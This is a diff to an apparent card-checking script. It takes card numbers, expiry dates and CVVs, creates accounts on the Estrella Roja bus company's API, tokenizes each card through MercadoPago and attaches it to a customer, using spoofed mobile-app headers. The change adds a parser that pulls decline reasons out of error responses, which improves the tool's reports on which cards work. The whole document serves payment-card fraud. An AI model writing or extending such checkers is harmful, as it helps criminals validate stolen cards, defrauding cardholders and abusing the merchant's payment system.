@@ -88,6 +88,40 @@ def _register_account(model: curl.Session) -> str:
         raise Exception(f'Login falló ({r3.status_code}): {r3.text[:80]}')
     return token
 
+def _mp_error(mp_j: dict) -> str:
+    """Extract a readable decline message from a MercadoPago error payload.
+    Beware that the raw body may be a JSON string like '{"cause":[...]}'."""
+    if isinstance(mp_j, str):
+        try:
+            mp_j = json.loads(mp_j)
+        except Exception:
+            return mp_j[:200]
+    if not isinstance(mp_j, dict):
+        return str(mp_j)[:200]
+
+    # Structured cause list (MercadoPago): {"cause":[{"code":...,"description":...}]}
+    causes = mp_j.get('cause')
+    if isinstance(causes, list) and causes:
+        c = causes[0]
+        if isinstance(c, dict):
+            code = c.get('code', '')
+            desc = c.get('description') or c.get('detail') or ''
+            if code and desc:
+                return f'Error {code}: {desc}'
+            return desc or str(code)
+        return str(c)
+
+    for key in ('message', 'error', 'description', 'detail', 'Error', 'reason', 'title'):
+        val = mp_j.get(key)
+        if val:
+            return str(val)
+
+    # Fall back to message / error / cause from top-level.
+    if mp_j.get('message'):
+        return str(mp_j['message'])
+    return None
+
+
 def _flow(num, mes, ano, cvv, retries: int=0) -> dict:
     mes = mes.zfill(2)
     ano = f'20{ano}' if len(ano) == 2 else ano
@@ -103,7 +137,7 @@ def _flow(num, mes, ano, cvv, retries: int=0) -> dict:
         mp_j = request1.json()
         mp_tok = mp_j.get('id')
         if not mp_tok or mp_j.get('status') != 'active':
-            cause = mp_j.get('cause', [{}])[0].get('description', '') if mp_j.get('cause') else ''
+            cause = _mp_error(mp_j)
             msg = f"MP Token Rejected: {mp_j.get('status', 'unknown')}" + (f' | {cause}' if cause else '')
             return {'status': True, 'success': False, 'message': msg, 'card': card_str}
         plain = json.dumps({'customer': {'customerId': _CUSTOMER_ID, 'email': data.mail, 'name': data.f_name, 'lastName': data.l_name, 'phone': data.phone, 'zipCode': data.zipcode}, 'card': {'name': f'{data.f_name} {data.l_name}', 'number': '', 'securityCode': '', 'token': mp_tok}})
@@ -112,7 +146,7 @@ def _flow(num, mes, ano, cvv, retries: int=0) -> dict:
         request2 = model.post(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards', headers=headers2, json=payload2, timeout=35)
         if request2.status_code not in (200, 201):
             rj = request2.json() if request2.text else {}
-            msg = rj.get('message') or rj.get('error') or rj.get('description') or rj.get('Error') or request2.text[:150]
+            msg = _mp_error(rj) or rj.get('message') or rj.get('error') or rj.get('description') or rj.get('Error') or request2.text[:150]
             return {'status': True, 'success': False, 'message': str(msg), 'card': card_str}
         headers3 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*', 'Authorization': f'Bearer {jwt}', 'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto'}
         request3 = model.get(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards?servicioId={_SERVICE_ID}&clientId={_CUSTOMER_ID}', headers=headers3, timeout=15)
